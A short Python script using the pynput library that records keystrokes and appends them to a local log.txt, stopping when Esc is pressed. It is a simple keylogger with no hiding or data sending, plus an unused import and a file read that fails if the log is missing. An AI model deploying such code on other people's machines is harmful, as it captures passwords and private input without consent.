from types import SimpleNamespace
from pynput.keyboard import Listener, Key

scale = 0

def on_press(key):
    if key == Key.space:
        write_file("\n")
    elif str(key).find("Key") == -1:
        write_file(str(key))

def write_file(keys):
    with open("log.txt", "r") as file:
        lines = file.readlines()
        if keys == "\n" and (len(lines) == 0 or lines[-1] == "\n"):
            return

    with open("log.txt", 'a') as file:
        keys = keys.replace("'", "")
        file.write(keys)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()